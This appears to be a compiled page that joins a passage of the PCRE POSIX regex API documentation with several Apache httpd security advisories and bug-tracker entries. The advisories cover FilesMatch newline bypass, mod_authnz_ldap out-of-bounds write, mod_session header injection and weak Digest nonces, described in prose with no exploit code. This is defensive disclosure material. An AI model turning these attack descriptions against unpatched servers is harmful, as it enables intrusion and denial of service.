structure types, *regex\_t* for compiled internal forms, and
*regmatch\_t* for returning captured substrings. It also defines some
constants whose names start with "REG\_"; these are used for setting options and
identifying error codes.

[COMPILING A PATTERN](#TOC1)

The function **regcomp()** is called to compile a pattern into an
internal form. The pattern is a C string terminated by a binary zero, and
is passed in the argument *pattern*. The *preg* argument is a pointer
to a **regex\_t** structure that is used as a base for storing information
about the compiled regular expression.

The argument *cflags* is either zero, or contains one or more of the bits
defined by the following macros:
```

  REG_DOTALL

```
The PCRE\_DOTALL option is set when the regular expression is passed for
compilation to the native function. Note that REG\_DOTALL is not part of the
POSIX standard.
```

  REG_ICASE

```
The PCRE\_CASELESS option is set when the regular expression is passed for
compilation to the native function.
```

  REG_NEWLINE

```
The PCRE\_MULTILINE option is set when the regular expression is passed for
compilation to the native function. Note that this does *not* mimic the
defined POSIX behaviour for REG\_NEWLINE (see the following section).
```

  REG_NOSUB

```
The PCRE\_NO\_AUTO\_CAPTURE option is set when the regular expression is passed
for compilation to the native function. In addition, when a pattern that is
compiled with this flag is passed to **regexec()** for matching, the
*nmatch* and *pmatch* arguments are ignored, and no captured strings
are returned.
```

  REG_UCP

```
The PCRE\_UCP option is set when the regular expression is passed for
compilation to the native function. This causes PCRE to use Unicode properties
when matchine \d, \w, etc., instead of just recognizing ASCII values. Note
that REG\_UTF8 is not part of the POSIX standard.
```

  REG_UNGREEDY

```
The PCRE\_UNGREEDY option is set when the regular expression is passed for
compilation to the native function. Note that REG\_UNGREEDY is not part of the
POSIX standard.
```

  REG_UTF8

```
The PCRE\_UTF8 option is set when the regular expression is passed for
compilation to the native function. This causes the pattern itself and all data
strings used for matching it to be treated as UTF-8 strings. Note that REG\_UTF8
is not part of the POSIX standard.

In the absence of these flags, no options are passed to the native function.
This means the the regex is compiled with PCRE default semantics. In
particular, the way it handles newline characters in the subject string is the
Perl way, not the POSIX way. Note that setting PCRE\_MULTILINE has only
*some* of the effects specified for REG\_NEWLINE. It does not affect the way
newlines are matched by . (they are not) or by a negative class such as [^a]
(they are).

The yield of **regcomp()** is zero on success, and non-zero otherwise. The
*preg* structure is filled in on success, and one member of the structure
is public: *re\_nsub* contains the number of capturing subpatterns in
the regular expression. Various error codes are defined in the header file.

NOTE: If the yield of **regcomp()** is non-zero, you must not attempt to
use the contents of the *preg* structure. If, for example, you pass it to
**regexec()**, the result is undefined and your program is likely to crash.

[MATCHING NEWLINE CHARACTERS](#TOC1)

This area is not simple, because POSIX and Perl take different views of things.
It is not possible to get PCRE to obey POSIX semantics, but then PCRE was never
intended to be a POSIX engine. The following table lists the different
possibilities for matching newline characters in PCRE:
```

                          Default   Change with

  . matches newline          no     PCRE_DOTALL
  newline matches [^a]       yes    not changeable
  $ matches \n at end        yes    PCRE_DOLLARENDONLY
  $ matches \n in middle     no     PCRE_MULTILINE
  ^ matches \n in middle     no     PCRE_MULTILINE

```
This is the equivalent table for POSIX:
```

                          Default   Change with

  . matches newline          yes    REG_NEWLINE
  newline matches [^a]       yes    REG_NEWLINE
  $ matches \n at end        no     REG_NEWLINE
  $ matches \n in middle     no     REG_NEWLINE
  ^ matches \n in middle     no     REG_NEWLINE

```
PCRE's behaviour is the same as Perl's, except that there is no equivalent for
PCRE\_DOLLAR\_ENDONLY in Perl. In both PCRE and Perl, there is no way to stop
newline from matching [^a].

The default POSIX newline handling can be obtained by setting PCRE\_DOTALL and
PCRE\_DOLLAR\_ENDONLY, but there is no way to make PCRE behave exactly as for the
REG\_NEWLINE action.

[MATCHING A PATTERN](#TOC1)

The function **regexec()** is called to match a compiled pattern *preg*
against a given *string*, which is by default terminated by a zero byte
(but see REG\_STARTEND below), subject to the options in *eflags*. These can
be:
```

  REG_NOTBOL

```
The PCRE\_NOTBOL option is set when calling the underlying PCRE matching
function.
```

  REG_NOTEMPTY

```
The PCRE\_NOTEMPTY option is set when calling the underlying PCRE matching
function. Note that REG\_NOTEMPTY is not part of the POSIX standard. However,
setting this option can give more POSIX-like behaviour in some situations.
```

  REG_NOTEOL

```
The PCRE\_NOTEOL option is set when calling the underlying PCRE matching
function.
```

  REG_STARTEND

```
The string is considered to start at *string* + *pmatch[0].rm\_so* and
to have a terminating NUL located at *string* + *pmatch[0].rm\_eo*
(there need not actually be a NUL at that location), regardless of the value of
*nmatch*. This is a BSD extension, compatible with but not specified by
IEEE Standard 1003.2 (POSIX.2), and should be used with caution in software
intended to be portable to other systems. Note that a non-zero *rm\_so* does
not imply REG\_NOTBOL; REG\_STARTEND affects only the location of the string, not
how it is matched.

If the pattern was compiled with the REG\_NOSUB flag, no data about any matched
strings is returned. The *nmatch* and *pmatch* arguments of
**regexec()** are ignored.

If the value of *nmatch* is zero, or if the value *pmatch* is NULL,
no data about any matched strings is returned.

Otherwise,the portion of the string that was matched, and also any captured
substrings, are returned via the *pmatch* argument, which points to an
array of *nmatch* structures of type *regmatch\_t*, containing the
members *rm\_so* and *rm\_eo*. These contain the offset to the first
character of each substring and the offset to the first character after the end
of each substring, respectively. The 0th element of the vector relates to the
entire portion of *string* that was matched; subsequent elements relate to
the capturing subpatterns of the regular expression. Unused entries in the
array have both structure members set to -1.

A successful match yields a zero return; various error codes are defined in the
header file, of which REG\_NOMATCH is the "expected" failure code.

[ERROR MESSAGES](#TOC1)

The **regerror()** function maps a non-zero errorcode from either
**regcomp()** or **regexec()** to a printable message. If *preg* is not
NULL, the error should have arisen from the use of that structure. A message
terminated by a binary zero is placed in *errbuf*. The length of the
message, including the zero, is limited to *errbuf\_size*. The yield of the
function is the size of buffer needed to hold the whole message.

[MEMORY USAGE](#TOC1)

Compiling a regular expression causes memory to be allocated and associated
with the *preg* structure. The function **regfree()** frees all such
memory, after which *preg* may no longer be used as a compiled expression.

#### Description

When an HTTP/2 stream was destroyed after being handled, the Apache HTTP Server prior to version 2.4.30 could have written a NULL pointer potentially to an already freed memory. The memory pools maintained by the server make this vulnerability hard to trigger in usual configurations, the reporter and the team could not reproduce it outside debug builds, so it is classified as low risk.

#### Description

Apache httpd allows remote attackers to read secret data from process memory if the Limit directive can be set in a user's .htaccess file, or if httpd.conf has certain misconfigurations, aka Optionsbleed. This affects the Apache HTTP Server through 2.2.34 and 2.4.x through 2.4.27. The attacker sends an unauthenticated OPTIONS HTTP request when attempting to read secret data. This is a use-after-free issue and thus secret data is not always sent, and the specific data depends on many factors including configuration. Exploitation with .htaccess can be blocked with a patch to the ap\_limit\_section function in server/core.c.

#### Description

A specially crafted request could have crashed the Apache HTTP Server prior to version 2.4.30, due to an out of bound access after a size limit is reached by reading the HTTP header. This vulnerability is considered very hard if not impossible to trigger in non-debug mode (both log and build level), so it is classified as low risk for common server usage.

| [Description](show_bug.cgi?id=1560634#c0)  Pedro Sampaio    2018-03-26 15:41:26 UTC  ``` When generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed.  In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.  Versions Affected: httpd 2.2.0 to 2.4.29  External references:  <https://httpd.apache.org/security/vulnerabilities_24.html>   ```  [Comment 1](show_bug.cgi?id=1560634#c1)  Pedro Sampaio    2018-03-26 15:42:01 UTC  ``` Created httpd tracking bugs for this issue:  Affects: fedora-all [[bug 1560635](show_bug.cgi?id=1560635 "CLOSED ERRATA - CVE-2018-1312 httpd: Weak Digest auth nonce generation in mod_auth_digest [fedora-all]")]   ```  [Comment 5](show_bug.cgi?id=1560634#c5)  Huzaifa S. Sidhpurwala    2018-04-12 04:05:19 UTC  ``` Upstream patchset:  <https://svn.apache.org/viewvc?view=revision&revision=1824481>  Upstream bug: <https://bz.apache.org/bugzilla/show_bug.cgi?id=54637>   ```  [Comment 7](show_bug.cgi?id=1560634#c7)  Huzaifa S. Sidhpurwala    2018-06-22 04:43:50 UTC  ``` Statement:  The "AuthType Digest" directive is not enabled in the default httpd configuration as shipped with Red Hat Enterprise Linux, and needs to be explicitly enabled. Therefore this flaw has no impact on the default versions of the httpd package as shipped with Red Hat Enterprise Linux. Also upstream discourages the use of mod_auth_digest because of its inherent security weaknesses and recommends the use of mod_ssl.   ```  [Comment 11](show_bug.cgi?id=1560634#c11)  errata-xmlrpc    2018-11-13 08:36:04 UTC  ``` This issue has been addressed in the following products:    Red Hat Software Collections for Red Hat Enterprise Linux 6   Red Hat Software Collections for Red Hat Enterprise Linux 7   Red Hat Software Collections for Red Hat Enterprise Linux 7.4 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.5 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.6 EUS  Via RHSA-2018:3558 [https://access.redhat.com/errata/RHSA-2018:3558](https://access.redhat.com/errata/RHSA-2018%3A3558)   ```  [Comment 12](show_bug.cgi?id=1560634#c12)  errata-xmlrpc    2019-02-18 16:55:47 UTC  ``` This issue has been addressed in the following products:    Red Hat JBoss Core Services  Via RHSA-2019:0366 [https://access.redhat.com/errata/RHSA-2019:0366](https://access.redhat.com/errata/RHSA-2019%3A0366)   ```  [Comment 13](show_bug.cgi?id=1560634#c13)  errata-xmlrpc    2019-02-18 16:58:27 UTC  ``` This issue has been addressed in the following products:    JBoss Core Services on RHEL 6   JBoss Core Services on RHEL 7  Via RHSA-2019:0367 [https://access.redhat.com/errata/RHSA-2019:0367](https://access.redhat.com/errata/RHSA-2019%3A0367)   ```  [Comment 15](show_bug.cgi?id=1560634#c15)  errata-xmlrpc    2019-07-29 15:15:54 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:1898 [https://access.redhat.com/errata/RHSA-2019:1898](https://access.redhat.com/errata/RHSA-2019%3A1898)   ``` |  |

## Topic

An update for httpd24-httpd, httpd24-nghttp2, and httpd24-curl is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The Apache HTTP Server is a powerful, efficient, and extensible web server. The httpd24 packages provide a recent stable release of version 2.4 of the Apache HTTP Server, along with the mod\_auth\_kerb module.

The following packages have been upgraded to a later upstream version: httpd24-httpd (2.4.34), httpd24-curl (7.61.1). (BZ#1590833, BZ#1648928)

Security Fix(es):

* httpd: Improper handling of headers in mod\_session can allow a remote user to modify session data for CGI applications (CVE-2018-1283)
* httpd: Out of bounds read in mod\_cache\_socache can allow a remote attacker to cause DoS (CVE-2018-1303)
* httpd: mod\_http2: Too much time allocated to workers, possibly leading to DoS (CVE-2018-1333)
* httpd: DoS for HTTP/2 connections by continuous SETTINGS frames (CVE-2018-11763)
* httpd: Out of bounds write in mod\_authnz\_ldap when using too small Accept-Language values (CVE-2017-15710)
* httpd: <FilesMatch> bypass with a trailing newline in the file name (CVE-2017-15715)

Bug Fix(es):

* Previously, the Apache HTTP Server from the httpd24 Software Collection was unable to handle situations when static content was repeatedly requested in a browser by refreshing the page. As a consequence, HTTP/2 connections timed out and httpd became unresponsive. This bug has been fixed, and HTTP/2 connections now work as expected in the described scenario. (BZ#1518737)

Enhancement(s):

* This update adds the mod\_md module to the httpd24 Software Collection. This module enables managing domains across virtual hosts and certificate provisioning using the Automatic Certificate Management Environment (ACME) protocol. The mod\_md module is available only for Red Hat Enterprise Linux 7. (BZ#1640722)

Additional Changes:

#### Description

In Apache httpd 2.4.0 to 2.4.29, the expression specified in <FilesMatch> could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are are externally blocked, but only by matching the trailing portion of the filename.

#### Description

In Apache httpd 2.0.23 to 2.0.65, 2.2.0 to 2.2.34, and 2.4.0 to 2.4.29, mod\_authnz\_ldap, if configured with AuthLDAPCharsetConfig, uses the Accept-Language header value to lookup the right charset encoding when verifying the user's credentials. If the header value is not present in the charset conversion table, a fallback mechanism is used to truncate it to a two characters value to allow a quick retry (for example, 'en-US' is truncated to 'en'). A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string. In the worst case, quite unlikely, the process would crash which could be used as a Denial of Service attack. In the more likely case, this memory is already reserved for future use and the issue has no effect at all.

| [Description](show_bug.cgi?id=1560614#c0)  Adam Mariš    2018-03-26 15:02:01 UTC  ``` The expression specified in <FilesMatch> could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are externally blocked, but only by matching the trailing portion of the filename.  Versions Affected: httpd 2.4.0 to 2.4.29  External References:  <https://httpd.apache.org/security/vulnerabilities_24.html>   ```  [Comment 2](show_bug.cgi?id=1560614#c2)  Adam Mariš    2018-03-26 15:04:38 UTC  ``` Created httpd tracking bugs for this issue:  Affects: fedora-all [[bug 1560618](show_bug.cgi?id=1560618 "CLOSED ERRATA - CVE-2017-15715 httpd: <FilesMatch> bypass with a trailing newline in the file name [fedora-all]")]   ```  [Comment 4](show_bug.cgi?id=1560614#c4)  Huzaifa S. Sidhpurwala    2018-04-10 06:43:03 UTC  ``` Upstream patch:  <https://svn.apache.org/viewvc?view=revision&revision=1824339>  As per the upstream changelog, the following change was made for this flaw:  Configure the regular expression engine to match '$' to the end of the input string only, excluding matching the end of any embedded  newline characters. Behavior can be changed with new directive  'RegexDefaultOptions'.   ```  [Comment 12](show_bug.cgi?id=1560614#c12)  errata-xmlrpc    2018-11-13 08:36:04 UTC  ``` This issue has been addressed in the following products:    Red Hat Software Collections for Red Hat Enterprise Linux 6   Red Hat Software Collections for Red Hat Enterprise Linux 7   Red Hat Software Collections for Red Hat Enterprise Linux 7.4 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.5 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.6 EUS  Via RHSA-2018:3558 [https://access.redhat.com/errata/RHSA-2018:3558](https://access.redhat.com/errata/RHSA-2018%3A3558)   ```  [Comment 13](show_bug.cgi?id=1560614#c13)  errata-xmlrpc    2019-02-18 16:55:43 UTC  ``` This issue has been addressed in the following products:    Red Hat JBoss Core Services  Via RHSA-2019:0366 [https://access.redhat.com/errata/RHSA-2019:0366](https://access.redhat.com/errata/RHSA-2019%3A0366)   ```  [Comment 14](show_bug.cgi?id=1560614#c14)  errata-xmlrpc    2019-02-18 16:58:23 UTC  ``` This issue has been addressed in the following products:    JBoss Core Services on RHEL 6   JBoss Core Services on RHEL 7  Via RHSA-2019:0367 [https://access.redhat.com/errata/RHSA-2019:0367](https://access.redhat.com/errata/RHSA-2019%3A0367)   ```  [Comment 20](show_bug.cgi?id=1560614#c20)  Cedric Buissart    2020-02-11 16:54:54 UTC  ``` Statement:  The "FilesMatch" directive is not enabled in the default httpd configuration as shipped with Red Hat Enterprise Linux, and needs to be explicitly enabled. Therefore this flaw has no impact on the default versions of the httpd package as shipped with Red Hat Enterprise Linux.  Red Hat Satellite 6 uses Red Hat Enterprise Linux 7's httpd package, and enables the "FilesMatch" directive. However, this is not believed to have an impact on security, as, in the context of a Satellite, no one is expected to have the ability to modify file names in the concerned directories. This is not considered as a vector for attack.   ```  [Comment 21](show_bug.cgi?id=1560614#c21)  errata-xmlrpc    2020-09-29 20:07:19 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2020:3958 [https://access.redhat.com/errata/RHSA-2020:3958](https://access.redhat.com/errata/RHSA-2020%3A3958)   ``` |  |

# [R1] Tenable.sc 5.13.0 Fixes Multiple Third-Party Vulnerabilities

High

[← View More Security Advisories](/security)
### Synopsis

Tenable.sc leverages third-party software to help provide underlying functionality. Three separate third-party components (OpenSSL, Apache HTTP Server, SimpleSAMLphp) were found to contain vulnerabilities, and updated versions have been made available by the providers.

Out of caution and in line with good practice, Tenable opted to upgrade the bundled libraries to address the potential impact of these issues in Tenable.sc. Tenable.sc 5.13.0 updates OpenSSL to 1.1.1d, Apache HTTP Server to 2.4.41, and SimpleSAMLphp to 1.17.7 to address the identified vulnerabilities.

Note: The CVSSv2 score used in this advisory reflects CVE-2017-3167, as it is considered the highest risk.

### Solution

Tenable has released Tenable.sc 5.13.0 to address these issues. The installation files can be obtained from the Tenable Downloads Portal (https://www.tenable.com/downloads/tenable-sc).

Package        : apache2
CVE ID         : CVE-2017-15710 CVE-2017-15715 CVE-2018-1283 CVE-2018-1301
                 CVE-2018-1303 CVE-2018-1312

Several vulnerabilities have been found in the Apache HTTPD server.

CVE-2017-15710

    Alex Nichols and Jakob Hirsch reported that mod_authnz_ldap, if
    configured with AuthLDAPCharsetConfig, could cause an of bound write
    if supplied with a crafted Accept-Language header. This could
    potentially be used for a Denial of Service attack.

CVE-2017-15715

    Elar Lang discovered that expression specified in <FilesMatch> could
    match '$' to a newline character in a malicious filename, rather
    than matching only the end of the filename. This could be exploited
    in environments where uploads of some files are are externally
    blocked, but only by matching the trailing portion of the filename.

CVE-2018-1283

    When mod_session is configured to forward its session data to CGI
    applications (SessionEnv on, not the default), a remote user could
    influence their content by using a "Session" header.

CVE-2018-1301

    Robert Swiecki reported that a specially crafted request could have
    crashed the Apache HTTP Server, due to an out of bound access after
    a size limit is reached by reading the HTTP header.

CVE-2018-1303

    Robert Swiecki reported that a specially crafted HTTP request header
    could have crashed the Apache HTTP Server if using
    mod_cache_socache, due to an out of bound read while preparing data
    to be cached in shared memory.

CVE-2018-1312

    Nicolas Daniels discovered that when generating an HTTP Digest
    authentication challenge, the nonce sent by mod_auth_digest to
    prevent reply attacks was not correctly generated using a
    pseudo-random seed. In a cluster of servers using a common Digest
    authentication configuration, HTTP requests could be replayed across
    servers by an attacker without detection.

For the oldstable distribution (jessie), these problems have been fixed
in version 2.4.10-10+deb8u12.

For the stable distribution (stretch), these problems have been fixed in
version 2.4.25-3+deb9u4.

We recommend that you upgrade your apache2 packages.

For the detailed security status of apache2 please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/apache2>

Original advisory details:

Alex Nichols and Jakob Hirsch discovered that the Apache HTTP Server

mod\_authnz\_ldap module incorrectly handled missing charset encoding

headers. A remote attacker could possibly use this issue to cause the

server to crash, resulting in a denial of service. ([CVE-2017-15710](/security/CVE-2017-15710))

Elar Lang discovered that the Apache HTTP Server incorrectly handled

certain characters specified in . A remote attacker could

possibly use this issue to upload certain files, contrary to expectations.

([CVE-2017-15715](/security/CVE-2017-15715))

It was discovered that the Apache HTTP Server mod\_session module

incorrectly handled certain headers. A remote attacker could possibly use

this issue to influence session data. ([CVE-2018-1283](/security/CVE-2018-1283))

Robert Swiecki discovered that the Apache HTTP Server incorrectly handled

certain requests. A remote attacker could possibly use this issue to cause

the server to crash, leading to a denial of service. ([CVE-2018-1301](/security/CVE-2018-1301))

Robert Swiecki discovered that the Apache HTTP Server mod\_cache\_socache

module incorrectly handled certain headers. A remote attacker could

possibly use this issue to cause the server to crash, leading to a denial

of service. ([CVE-2018-1303](/security/CVE-2018-1303))

Nicolas Daniels discovered that the Apache HTTP Server incorrectly

generated the nonce when creating HTTP Digest authentication challenges.

A remote attacker could possibly use this issue to replay HTTP requests

across a cluster of servers. ([CVE-2018-1312](/security/CVE-2018-1312))

#### Description

In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.
